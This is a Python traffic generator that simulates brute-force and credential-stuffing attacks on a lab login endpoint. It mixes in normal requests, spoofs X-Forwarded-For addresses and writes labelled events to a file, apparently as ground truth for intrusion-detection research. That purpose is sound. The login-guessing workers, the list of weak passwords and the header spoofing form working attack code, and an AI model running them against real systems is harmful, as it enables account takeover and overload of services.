import requests
import time
import random
import threading
import os
import json


TARGET = "http://victim:5000"
LOGIN_ENDPOINT = "/login"
NORMAL_ENDPOINTS = ["/", "/health", "/api/items", "/search"]
SEARCH_TERMS = ["status", "billing", "profile", "logs", "dashboard"]
USER_AGENTS = [
    "Mozilla/5.0 normal-browser",
    "curl/8.0 health-check",
    "python-requests/2.31 internal-client",
    "CloudMonitor/1.0",
]
NORMAL_IP_POOL = int(os.getenv("NORMAL_IP_POOL", "15"))
ATTACK_IP_POOL = int(os.getenv("ATTACK_IP_POOL", "10"))
NORMAL_IP_POOL = max(1, NORMAL_IP_POOL)
ATTACK_IP_POOL = max(1, ATTACK_IP_POOL)
NORMAL_IPS = [f"10.0.0.{i}" for i in range(10, 10 + NORMAL_IP_POOL)]
ATTACK_IPS = [f"172.16.5.{i}" for i in range(50, 50 + ATTACK_IP_POOL)]

ATTACK_DURATION = int(os.getenv("ATTACK_DURATION", "30"))
REQUESTS_PER_SECOND = int(os.getenv("REQUESTS_PER_SECOND", "10"))
THREADS = int(os.getenv("THREADS", "3"))
ATTACK_STYLE = os.getenv("ATTACK_STYLE", "brute_force")

NORMAL_TRAFFIC_RATIO = float(os.getenv("NORMAL_TRAFFIC_RATIO", "0.3"))
RANDOM_SEED = int(os.getenv("RANDOM_SEED", "42"))
SCENARIO_NAME = os.getenv("SCENARIO_NAME", "adhoc")
LABEL_FILE = os.getenv("LABEL_FILE", "/logs/traffic_labels.jsonl")
WARMUP_SECONDS = int(os.getenv("WARMUP_SECONDS", "20"))
COOLDOWN_SECONDS = int(os.getenv("COOLDOWN_SECONDS", "20"))
COMPROMISED_USERS = ["admin", "ops", "dev", "billing", "support"]
LEAKED_PASSWORDS = ["admin123", "password1", "welcome1", "letmein", "qwerty123"]

label_lock = threading.Lock()


def write_label_event(label, worker_id, client_ip, endpoint):
    event = {
        "time": time.time(),
        "label": label,
        "worker_id": worker_id,
        "scenario": SCENARIO_NAME,
        "client_ip": client_ip,
        "endpoint": endpoint,
    }
    with label_lock:
        with open(LABEL_FILE, "a", encoding="utf-8") as handle:
            handle.write(json.dumps(event) + "\n")


def request_headers(client_ip):
    return {
        "X-Forwarded-For": client_ip,
        "User-Agent": random.choice(USER_AGENTS),
    }


def normal_request(worker_id):
    endpoint = LOGIN_ENDPOINT if random.random() < 0.10 else random.choice(NORMAL_ENDPOINTS)
    client_ip = random.choice(NORMAL_IPS)
    headers = request_headers(client_ip)

    try:
        if endpoint == "/search":
            requests.get(
                TARGET + endpoint,
                params={"q": random.choice(SEARCH_TERMS)},
                headers=headers,
                timeout=1,
            )
        elif endpoint == LOGIN_ENDPOINT:
            requests.post(
                TARGET + endpoint,
                data={"username": "admin", "password": "admin"},
                headers=headers,
                timeout=1,
            )
        else:
            requests.get(TARGET + endpoint, headers=headers, timeout=1)

        write_label_event("normal", worker_id, client_ip, endpoint)
    except requests.RequestException:
        pass


def brute_force_request(worker_id):
    client_ip = random.choice(ATTACK_IPS)
    username = "admin"
    password = str(random.randint(1000, 9999))

    if ATTACK_STYLE == "credential_stuffing":
        username = random.choice(COMPROMISED_USERS)
        password = random.choice(LEAKED_PASSWORDS)

    try:
        requests.post(
            TARGET + LOGIN_ENDPOINT,
            data={
                "username": username,
                "password": password,
            },
            headers=request_headers(client_ip),
            timeout=1
        )
        write_label_event("attack", worker_id, client_ip, LOGIN_ENDPOINT)
    except requests.RequestException:
        pass


def attack_worker(worker_id):
    print(f"[Worker {worker_id}] started")

    phase_plan = [
        ("warmup", WARMUP_SECONDS, 1.0),
        ("attack", ATTACK_DURATION, NORMAL_TRAFFIC_RATIO),
        ("cooldown", COOLDOWN_SECONDS, 1.0),
    ]

    for phase_name, phase_seconds, normal_ratio in phase_plan:
        if phase_seconds <= 0:
            continue

        phase_start = time.time()
        while time.time() - phase_start < phase_seconds:
            if random.random() < normal_ratio:
                normal_request(worker_id)
            else:
                brute_force_request(worker_id)

            jitter = random.uniform(0.75, 1.25)
            time.sleep((1 / REQUESTS_PER_SECOND) * jitter)

        print(f"[Worker {worker_id}] phase completed: {phase_name}")

    print(f"[Worker {worker_id}] finished")



if __name__ == "__main__":
    random.seed(RANDOM_SEED)

    # Reset the label file for each run to keep ground truth clean.
    os.makedirs(os.path.dirname(LABEL_FILE), exist_ok=True)
    with open(LABEL_FILE, "w", encoding="utf-8") as handle:
        metadata = {
            "time": time.time(),
            "event": "start",
            "scenario": SCENARIO_NAME,
            "warmup_seconds": WARMUP_SECONDS,
            "attack_seconds": ATTACK_DURATION,
            "cooldown_seconds": COOLDOWN_SECONDS,
            "rps": REQUESTS_PER_SECOND,
            "threads": THREADS,
            "normal_ratio": NORMAL_TRAFFIC_RATIO,
        }
        handle.write(json.dumps(metadata) + "\n")

    print("🚦 Starting controlled DDoS / brute-force simulation")
    print(f"Target: {TARGET}")
    print(
        "Phases: "
        f"warmup={WARMUP_SECONDS}s, "
        f"attack={ATTACK_DURATION}s, "
        f"cooldown={COOLDOWN_SECONDS}s"
    )
    print(f"Attack style: {ATTACK_STYLE}")
    print(f"Threads: {THREADS}")
    print(f"Rate per thread: {REQUESTS_PER_SECOND} req/s")
    print(f"Normal IP pool: {len(NORMAL_IPS)}")
    print(f"Attack IP pool: {len(ATTACK_IPS)}")

    threads = []

    for i in range(THREADS):
        t = threading.Thread(target=attack_worker, args=(i,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("Traffic simulation completed")
